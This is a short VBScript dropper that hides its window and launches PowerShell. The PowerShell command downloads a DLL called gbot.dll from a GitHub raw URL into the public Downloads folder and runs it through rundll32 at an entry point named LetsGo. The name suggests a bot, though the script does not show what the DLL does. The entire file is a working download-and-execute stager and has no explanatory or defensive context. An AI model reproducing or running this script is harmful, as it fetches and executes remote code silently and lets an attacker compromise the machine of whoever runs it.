Dim objShell
Set objShell = WScript.CreateObject ("WScript.shell")

objShell.run "PowerShell (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/fadyosman/Gbot/master/gbot.dll','C:\Users\Public\Downloads\gbot.dll');(New-Object -com Shell.Application).ShellExecute('rundll32.exe C:\Users\Public\Downloads\gbot.dll,LetsGo');", 0, True
Set objShell = Nothing
